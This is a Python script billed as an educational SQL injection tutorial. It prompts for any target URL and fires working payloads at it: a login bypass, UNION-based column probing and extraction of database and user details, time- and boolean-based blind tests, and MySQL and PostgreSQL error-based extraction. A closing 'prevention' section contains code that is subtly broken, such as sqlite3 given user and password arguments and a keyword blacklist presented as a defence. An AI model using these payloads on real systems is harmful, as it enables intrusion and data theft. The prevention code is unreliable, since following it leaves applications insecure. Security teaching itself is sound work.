#!/usr/bin/env python3
"""
EDUCATIONAL PURPOSE ONLY - SQL Injection Tutorial
This tutorial demonstrates SQL injection vulnerabilities for educational and defensive purposes.

LEGAL DISCLAIMER:
This code is for educational purposes only. Use only on systems you own or have explicit permission to test.
Unauthorized access to computer systems is illegal and unethical.
"""

import requests
import sys
import time
from urllib.parse import quote

class SQLInjectionTutorial:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        
    def basic_sql_injection(self):
        """
        Basic SQL Injection Example
        Demonstrates how SQL injection works in a vulnerable login form
        """
        print("=== Basic SQL Injection Tutorial ===")
        print("Target URL:", self.target_url)
        print("\n1. Normal Login Attempt:")
        
        # Normal login attempt
        normal_data = {
            'username': 'admin',
            'password': 'password123'
        }
        
        response = self.session.post(f"{self.target_url}/login", data=normal_data)
        print(f"Normal login response: {response.status_code}")
        
        print("\n2. SQL Injection Attack:")
        print("Payload: admin' OR '1'='1' --")
        print("This payload bypasses authentication by making the SQL query always true")
        
        # SQL Injection payload
        malicious_data = {
            'username': "admin' OR '1'='1' --",
            'password': 'anything'
        }
        
        response = self.session.post(f"{self.target_url}/login", data=malicious_data)
        print(f"SQL Injection response: {response.status_code}")
        
        if "welcome" in response.text.lower() or response.status_code == 200:
            print("⚠️  VULNERABILITY DETECTED: Authentication bypassed!")
        else:
            print("✅ No vulnerability detected")
    
    def union_based_injection(self):
        """
        Union-based SQL Injection
        Demonstrates how to extract data using UNION queries
        """
        print("\n=== Union-Based SQL Injection Tutorial ===")
        
        # Step 1: Determine number of columns
        print("Step 1: Determining number of columns")
        for i in range(1, 10):
            payload = f"1' UNION SELECT {','.join(['NULL'] * i)} --"
            response = self.session.get(f"{self.target_url}/search?q={quote(payload)}")
            
            if "error" not in response.text.lower():
                print(f"✅ Number of columns: {i}")
                break
        
        # Step 2: Extract database information
        print("\nStep 2: Extracting database information")
        payload = "1' UNION SELECT version(), database(), user() --"
        response = self.session.get(f"{self.target_url}/search?q={quote(payload)}")
        
        if response.status_code == 200:
            print("✅ Database information extracted")
            print(f"Response: {response.text[:200]}...")
    
    def blind_sql_injection(self):
        """
        Blind SQL Injection
        Demonstrates time-based and boolean-based blind SQL injection
        """
        print("\n=== Blind SQL Injection Tutorial ===")
        
        # Time-based blind SQL injection
        print("1. Time-Based Blind SQL Injection:")
        print("Payload: 1'; WAITFOR DELAY '00:00:05' --")
        
        start_time = time.time()
        payload = "1'; WAITFOR DELAY '00:00:05' --"
        response = self.session.get(f"{self.target_url}/search?q={quote(payload)}")
        end_time = time.time()
        
        response_time = end_time - start_time
        print(f"Response time: {response_time:.2f} seconds")
        
        if response_time > 4:
            print("⚠️  VULNERABILITY DETECTED: Time delay indicates blind SQL injection!")
        else:
            print("✅ No time-based vulnerability detected")
        
        # Boolean-based blind SQL injection
        print("\n2. Boolean-Based Blind SQL Injection:")
        
        # Test for true condition
        true_payload = "1' AND 1=1 --"
        true_response = self.session.get(f"{self.target_url}/search?q={quote(true_payload)}")
        
        # Test for false condition
        false_payload = "1' AND 1=2 --"
        false_response = self.session.get(f"{self.target_url}/search?q={quote(false_payload)}")
        
        if true_response.text != false_response.text:
            print("⚠️  VULNERABILITY DETECTED: Different responses indicate boolean-based blind SQL injection!")
        else:
            print("✅ No boolean-based vulnerability detected")
    
    def error_based_injection(self):
        """
        Error-based SQL Injection
        Demonstrates how to extract information from database errors
        """
        print("\n=== Error-Based SQL Injection Tutorial ===")
        
        # MySQL error-based injection
        mysql_payload = "1' AND extractvalue(1, concat(0x7e, (select version()), 0x7e)) --"
        response = self.session.get(f"{self.target_url}/search?q={quote(mysql_payload)}")
        
        if "XPATH syntax error" in response.text:
            print("⚠️  VULNERABILITY DETECTED: MySQL error-based injection!")
            print("Version information extracted from error message")
        else:
            print("✅ No MySQL error-based vulnerability detected")
        
        # PostgreSQL error-based injection
        postgres_payload = "1'; SELECT cast(version() as int) --"
        response = self.session.get(f"{self.target_url}/search?q={quote(postgres_payload)}")
        
        if "invalid input syntax" in response.text:
            print("⚠️  VULNERABILITY DETECTED: PostgreSQL error-based injection!")
            print("Version information extracted from error message")
        else:
            print("✅ No PostgreSQL error-based vulnerability detected")
    
    def sql_injection_prevention(self):
        """
        SQL Injection Prevention Techniques
        Demonstrates secure coding practices
        """
        print("\n=== SQL Injection Prevention Tutorial ===")
        
        print("1. Parameterized Queries (Recommended):")
        secure_code = '''
# SECURE: Using parameterized queries
import sqlite3

def secure_login(username, password):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    # Using parameterized query
    query = "SELECT * FROM users WHERE username = ? AND password = ?"
    cursor.execute(query, (username, password))
    
    result = cursor.fetchone()
    conn.close()
    return result
'''
        print(secure_code)
        
        print("2. Input Validation:")
        validation_code = '''
# SECURE: Input validation
import re

def validate_input(input_string):
    # Remove dangerous characters
    dangerous_chars = ['"', "'", ';', '--', '/*', '*/', 'xp_', 'sp_']
    
    for char in dangerous_chars:
        if char in input_string.lower():
            return False
    
    # Check for SQL keywords
    sql_keywords = ['select', 'insert', 'update', 'delete', 'drop', 'create', 'alter']
    for keyword in sql_keywords:
        if keyword in input_string.lower():
            return False
    
    return True

def secure_login_with_validation(username, password):
    if not validate_input(username) or not validate_input(password):
        return False
    
    # Proceed with parameterized query
    return secure_login(username, password)
'''
        print(validation_code)
        
        print("3. Least Privilege Principle:")
        privilege_code = '''
# SECURE: Using least privilege database user
# Create a database user with minimal privileges
# GRANT SELECT, INSERT, UPDATE ON specific_table TO app_user;

def connect_with_limited_privileges():
    # Connect using a user with limited privileges
    conn = sqlite3.connect('database.db', 
                          user='app_user', 
                          password='secure_password')
    return conn
'''
        print(privilege_code)
    
    def run_tutorial(self):
        """
        Run the complete SQL injection tutorial
        """
        print("🔒 SQL Injection Tutorial - Educational Purpose Only")
        print("=" * 60)
        
        try:
            self.basic_sql_injection()
            self.union_based_injection()
            self.blind_sql_injection()
            self.error_based_injection()
            self.sql_injection_prevention()
            
        except requests.exceptions.RequestException as e:
            print(f"❌ Connection error: {e}")
            print("Note: This tutorial requires a vulnerable test application")
        except Exception as e:
            print(f"❌ Error: {e}")
        
        print("\n" + "=" * 60)
        print("✅ Tutorial completed!")
        print("Remember: Always use these techniques responsibly and legally!")

def main():
    """
    Main function to run the SQL injection tutorial
    """
    print("SQL Injection Tutorial - Educational Purpose Only")
    print("⚠️  WARNING: Use only on systems you own or have explicit permission to test!")
    
    # Example target (replace with your test environment)
    target_url = input("Enter target URL (or press Enter for localhost:8080): ").strip()
    if not target_url:
        target_url = "http://localhost:8080"
    
    tutorial = SQLInjectionTutorial(target_url)
    tutorial.run_tutorial()

if __name__ == "__main__":
    main()

